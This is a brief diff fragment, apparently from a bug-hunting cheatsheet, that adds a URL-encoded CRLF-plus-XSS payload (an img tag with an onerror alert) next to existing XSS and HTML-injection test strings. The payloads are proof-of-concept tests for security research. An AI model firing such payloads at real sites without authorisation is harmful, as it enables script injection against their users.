@@ -25,6 +25,10 @@
 <img src=x onerror=alert(1337)>
 ```
 ![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
+```
+```
+y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
+```
 #### For testing.
 ```js
 "><h1>cyborg.71</h1>
